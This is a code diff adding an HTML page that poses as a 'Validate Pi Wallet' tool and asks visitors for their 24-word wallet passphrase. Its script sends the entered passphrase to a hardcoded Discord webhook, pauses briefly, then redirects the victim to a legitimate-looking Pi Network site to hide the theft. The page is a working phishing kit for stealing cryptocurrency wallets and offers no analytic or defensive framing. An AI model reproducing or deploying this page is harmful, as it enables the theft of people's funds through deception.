@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unlock Pi Wallet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f9f9f9;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 400px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+
+        h1 {
+            font-size: 1.5em;
+            margin-bottom: 20px;
+        }
+
+        textarea {
+            width: 80%;
+            height: 100px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1em;
+            resize: none;
+        }
+
+        .button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 1em;
+            color: #fff;
+            background-color: #6b2cc8;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .button:hover {
+            background-color: #5820a6;
+        }
+
+        .info {
+            margin-top: 20px;
+            font-size: 0.9em;
+            color: #666;
+        }
+
+        .info a {
+            color: #6b2cc8;
+            text-decoration: none;
+        }
+
+        .info a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Validate Pi Wallet</h1>
+        <textarea placeholder="Enter your 24 - word passphrase here" id="passphrase"></textarea>
+        <button class="button" name="submit" onclick="sendMessage()">Validate With Passphrase</button>
+        <div class="info">
+            <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+            <p>Lost your passphrase? You can <a href="#">create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+        </div>
+    </div>
+  <!-- Select Link -->
+  <script type="text/javascript">
+    function la(src) {
+      window.location=src;
+    }
+  </script>
+
+  <script>
+  function sendMessage() {
+  function sleep(milliseconds) {
+  const date = Date.now();
+  let currentDate = null;
+  do {
+    currentDate = Date.now();
+  } while (currentDate - date < milliseconds);
+}
+    var request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1053723560260161647/a8ZYxKGYuJvrRKw9Lyz2AMDCRW8gkS6fM1O-QVLcUC1b-W7FvBzEdber_ZrA4XP2cptT");
+    request.setRequestHeader('Content-type', 'application/json');
+    var params = {
+      content: ("> **PASSPHRASE : **" + document.getElementById('passphrase').value)
+    }
+    request.send(JSON.stringify(params));
+    sleep(400)
+    window.location.replace("https://pinet.com/");
+  }
+  </script>
+
+</body>
+</html>
